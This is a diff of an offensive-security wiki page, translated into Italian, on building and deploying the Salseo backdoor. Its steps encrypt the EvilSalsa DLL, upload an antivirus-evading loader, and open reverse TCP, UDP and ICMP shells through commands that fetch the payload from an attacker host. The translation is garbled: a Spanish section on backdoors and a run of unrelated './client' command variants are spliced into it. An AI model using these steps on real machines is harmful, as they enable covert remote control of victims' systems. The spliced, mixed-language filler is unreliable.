@@ -2,171 +2,274 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-## Compiling the binaries
+## Compilazione dei binari
 
-Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.
+Scarica il codice sorgente da github e compila **EvilSalsa** e **SalseoLoader**. Avrai bisogno di **Visual Studio** installato per compilare il codice.
 
-Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).
+Compila questi progetti per l'architettura della finestra di Windows in cui li utilizzerai (se Windows supporta x64, compilali per quella architettura).
 
-You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
+Puoi **selezionare l'architettura** all'interno di Visual Studio nella **scheda "Build" a sinistra** in **"Platform Target".**
 
-(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+(\*\*Se non riesci a trovare queste opzioni, premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)
 
 ![](<../.gitbook/assets/image (132).png>)
 
-Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
+Quindi, compila entrambi i progetti (Build -> Build Solution) (Nei log apparirà il percorso dell'eseguibile):
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
-## Prepare the Backdoor
+## Prepara la backdoor
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:
+Prima di tutto, dovrai codificare il **EvilSalsa.dll.** Per farlo, puoi utilizzare lo script python **encrypterassembly.py** o puoi compilare il progetto **EncrypterAssembly**:
 
 ### **Python**
-
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-
 ### Windows
 
+#### Salseo
+
+##### Salseo - Backdoor
+
+Un backdoor es una forma de acceso no autorizado a un sistema o aplicación que permite a un atacante evadir los mecanismos de seguridad y obtener control remoto sobre el sistema comprometido. El backdoor puede ser instalado de manera oculta y puede permitir al atacante ejecutar comandos, robar información o realizar otras acciones maliciosas sin ser detectado.
+
+##### Salseo - Tipos de Backdoors
+
+Existen diferentes tipos de backdoors que pueden ser utilizados en sistemas Windows:
+
+- **Backdoors de puerta trasera**: Estos backdoors son programas o scripts que se instalan en el sistema y permiten al atacante acceder al sistema comprometido de forma remota. Pueden ser instalados de manera oculta y pueden proporcionar al atacante un control total sobre el sistema.
+
+- **Backdoors de shell inverso**: Estos backdoors permiten al atacante establecer una conexión remota con el sistema comprometido a través de un shell inverso. El atacante puede ejecutar comandos en el sistema y recibir la salida de los comandos de forma remota.
+
+- **Backdoors de persistencia**: Estos backdoors se instalan en el sistema comprometido de manera que se ejecuten automáticamente cada vez que el sistema se inicie. Esto permite al atacante mantener el acceso al sistema de forma persistente.
+
+##### Salseo - Técnicas de Backdooring
+
+Existen varias técnicas que pueden ser utilizadas para instalar un backdoor en un sistema Windows:
+
+- **Explotación de vulnerabilidades**: Los atacantes pueden aprovechar las vulnerabilidades presentes en el sistema o en las aplicaciones instaladas para instalar un backdoor. Esto puede incluir la explotación de vulnerabilidades de día cero, que son vulnerabilidades desconocidas para el fabricante y para las cuales no existe un parche disponible.
+
+- **Ingeniería social**: Los atacantes pueden utilizar técnicas de ingeniería social para engañar a los usuarios y hacer que instalen un backdoor de forma voluntaria. Esto puede incluir el envío de correos electrónicos de phishing, la creación de sitios web falsos o la distribución de archivos maliciosos disfrazados como archivos legítimos.
+
+- **Uso de herramientas de hacking**: Los atacantes pueden utilizar herramientas de hacking específicas para instalar un backdoor en un sistema Windows. Estas herramientas pueden incluir exploits, kits de herramientas de hacking o malware diseñado específicamente para instalar backdoors.
+
+##### Salseo - Detección y Prevención de Backdoors
+
+La detección y prevención de backdoors en sistemas Windows puede ser un desafío, ya que los backdoors están diseñados para ser sigilosos y evadir los mecanismos de seguridad. Sin embargo, existen algunas medidas que se pueden tomar para detectar y prevenir los backdoors:
+
+- **Mantener el sistema actualizado**: Mantener el sistema operativo y las aplicaciones instaladas actualizadas con los últimos parches de seguridad puede ayudar a prevenir la explotación de vulnerabilidades conocidas.
+
+- **Utilizar software de seguridad**: Utilizar software de seguridad, como antivirus y firewalls, puede ayudar a detectar y bloquear la instalación de backdoors.
+
+- **Realizar análisis de seguridad regulares**: Realizar análisis de seguridad regulares en el sistema puede ayudar a detectar la presencia de backdoors. Esto puede incluir el uso de herramientas de escaneo de vulnerabilidades y análisis de malware.
+
+- **Educación y concienciación del usuario**: Educar a los usuarios sobre las técnicas de ingeniería social y los riesgos de instalar software desconocido puede ayudar a prevenir la instalación de backdoors de forma voluntaria.
+
+- **Monitorizar el tráfico de red**: Monitorizar el tráfico de red puede ayudar a detectar la comunicación de un backdoor con el atacante. Esto puede incluir el uso de herramientas de monitorización de red y análisis de registros de eventos.
+
+- **Realizar auditorías de seguridad**: Realizar auditorías de seguridad regulares en el sistema puede ayudar a identificar y corregir posibles vulnerabilidades que podrían ser explotadas para instalar backdoors.
+
+##### Salseo - Eliminación de Backdoors
+
+Si se detecta la presencia de un backdoor en un sistema Windows, es importante tomar medidas para eliminarlo y asegurar el sistema. Algunas medidas que se pueden tomar incluyen:
+
+- **Desconectar el sistema de la red**: Desconectar el sistema de la red puede ayudar a prevenir la comunicación del backdoor con el atacante y evitar que se realicen acciones maliciosas adicionales.
+
+- **Escanear y limpiar el sistema**: Utilizar herramientas de escaneo de malware y antivirus para buscar y eliminar el backdoor del sistema.
+
+- **Restaurar desde una copia de seguridad**: Si se dispone de una copia de seguridad del sistema antes de la infección, se puede restaurar el sistema desde esa copia para eliminar el backdoor.
+
+- **Cambiar contraseñas**: Cambiar las contraseñas de las cuentas comprometidas puede ayudar a prevenir el acceso no autorizado al sistema.
+
+- **Reforzar la seguridad del sistema**: Tomar medidas adicionales para reforzar la seguridad del sistema, como actualizar contraseñas, habilitar la autenticación de dos factores y restringir los permisos de usuario.
+
+- **Investigar la causa**: Investigar la causa de la infección del backdoor puede ayudar a identificar las vulnerabilidades o las técnicas utilizadas por el atacante, lo que puede ayudar a prevenir futuras infecciones.
+
+##### Salseo - Conclusión
+
+Los backdoors son una amenaza seria para la seguridad de los sistemas Windows, ya que permiten a los atacantes obtener acceso no autorizado y control remoto sobre un sistema comprometido. La detección y prevención de backdoors puede ser un desafío, pero tomando medidas como mantener el sistema actualizado, utilizar software de seguridad y realizar análisis de seguridad regulares, se puede reducir el riesgo de infección. Si se detecta la presencia de un backdoor, es importante tomar medidas para eliminarlo y asegurar el sistema.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
+Ok, ora hai tutto il necessario per eseguire tutto il procedimento di Salseo: il **file EvilDalsa.dll codificato** e il **binario di SalseoLoader**.
 
-Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**
+**Carica il binario SalseoLoader.exe sulla macchina. Non dovrebbe essere rilevato da nessun antivirus...**
 
-**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
+## **Esegui la backdoor**
 
-## **Execute the backdoor**
+### **Ottenere una shell inversa TCP (scaricando la dll codificata tramite HTTP)**
 
-### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
-
-Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.
-
+Ricorda di avviare un nc come listener per la shell inversa e un server HTTP per servire il file evilsalsa codificato.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
+### **Ottenere una shell inversa UDP (scaricando una dll codificata tramite SMB)**
 
-### **Getting a UDP reverse shell (downloading encoded dll through SMB)**
-
-Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
-
+Ricorda di avviare un nc come listener per la shell inversa e un server SMB per servire l'evilsalsa codificato (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
+### **Ottenere una shell inversa ICMP (dll codificata già presente nella vittima)**
 
-### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
+**Questa volta è necessario uno strumento speciale nel client per ricevere la shell inversa. Scarica:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
-
-#### **Disable ICMP Replies:**
-
+#### **Disabilita le risposte ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
+#### Esegui il client:
 
-#### Execute the client:
+```bash
+./client
+```
 
+#### Execute the client with arguments:
+
+```bash
+./client arg1 arg2
+```
+
+#### Execute the client in the background:
+
+```bash
+./client &
+```
+
+#### Execute the client and redirect output to a file:
+
+```bash
+./client > output.txt
+```
+
+#### Execute the client and append output to a file:
+
+```bash
+./client >> output.txt
+```
+
+#### Execute the client and send output to /dev/null:
+
+```bash
+./client > /dev/null
+```
+
+#### Execute the client and send output and errors to /dev/null:
+
+```bash
+./client > /dev/null 2>&1
+```
+
+#### Execute the client and run a command after it finishes:
+
+```bash
+./client ; echo "Command executed"
+```
+
+#### Execute the client and run a command only if it succeeds:
+
+```bash
+./client && echo "Command executed"
+```
+
+#### Execute the client and run a command only if it fails:
+
+```bash
+./client || echo "Command executed"
+```
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-
-#### Inside the victim, lets execute the salseo thing:
-
+#### All'interno della vittima, eseguiamo la cosa del salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
+## Compilazione di SalseoLoader come DLL esportando la funzione principale
 
-## Compiling SalseoLoader as DLL exporting main function
+Apri il progetto SalseoLoader utilizzando Visual Studio.
 
-Open the SalseoLoader project using Visual Studio.
-
-### Add before the main function: \[DllExport]
+### Aggiungi prima della funzione principale: \[DllExport]
 
 ![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Install DllExport for this project
+### Installa DllExport per questo progetto
 
-#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
+#### **Strumenti** --> **Gestione pacchetti NuGet** --> **Gestisci pacchetti NuGet per la soluzione...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
+#### **Cerca il pacchetto DllExport (utilizzando la scheda Sfoglia) e premi Installa (e accetta il popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In your project folder have appeared the files: **DllExport.bat** and **DllExport\_Configure.bat**
+Nella cartella del tuo progetto sono apparsi i file: **DllExport.bat** e **DllExport\_Configure.bat**
 
-### **U**ninstall DllExport
+### **Disinstalla DllExport**
 
-Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+Premi **Disinstalla** (sì, è strano ma fidati, è necessario)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **Exit Visual Studio and execute DllExport\_configure**
+### **Esci da Visual Studio ed esegui DllExport\_configure**
 
-Just **exit** Visual Studio
+Semplicemente **esci** da Visual Studio
 
-Then, go to your **SalseoLoader folder** and **execute DllExport\_Configure.bat**
+Quindi, vai nella tua cartella **SalseoLoader** ed **esegui DllExport\_Configure.bat**
 
-Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+Seleziona **x64** (se lo utilizzerai all'interno di una macchina x64, come nel mio caso), seleziona **System.Runtime.InteropServices** (all'interno di **Namespace per DllExport**) e premi **Applica**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
-### **Open the project again with visual Studio**
+### **Apri nuovamente il progetto con Visual Studio**
 
-**\[DllExport]** should not be longer marked as error
+**\[DllExport]** non dovrebbe più essere segnato come errore
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-### Build the solution
+### Compila la soluzione
 
-Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)
+Seleziona **Tipo di output = Libreria di classi** (Progetto --> Proprietà SalseoLoader --> Applicazione --> Tipo di output = Libreria di classi)
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)
+Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compila --> Destinazione della piattaforma = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)
+Per **compilare** la soluzione: Compila --> Compila soluzione (Nella console di output verrà visualizzato il percorso della nuova DLL)
 
-### Test the generated Dll
+### Testa la DLL generata
 
-Copy and paste the Dll where you want to test it.
+Copia e incolla la DLL dove vuoi testarla.
 
-Execute:
-
+Esegui:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
+Se non appare alcun errore, probabilmente hai una DLL funzionante!!
 
-If no error appears, probably you have a functional DLL!!
+## Ottieni una shell utilizzando la DLL
 
-## Get a shell using the DLL
-
-Don't forget to use a **HTTP** **server** and set a **nc** **listener**
+Non dimenticare di utilizzare un **server** **HTTP** e impostare un **listener nc**
 
 ### Powershell
-
 ```
 $env:pass="password"
 $env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
@@ -175,9 +278,9 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-
 ### CMD
 
+CMD (Command Prompt) è un interprete di comandi per i sistemi operativi Windows. È uno strumento potente che consente agli utenti di interagire con il sistema operativo tramite comandi testuali. CMD può essere utilizzato per eseguire una varietà di operazioni, come l'esecuzione di programmi, la gestione dei file e delle cartelle, la configurazione delle impostazioni di rete e molto altro ancora. È uno strumento essenziale per i professionisti dell'hacking, in quanto consente loro di eseguire comandi personalizzati per ottenere accesso e controllo sui sistemi target.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -186,17 +289,16 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
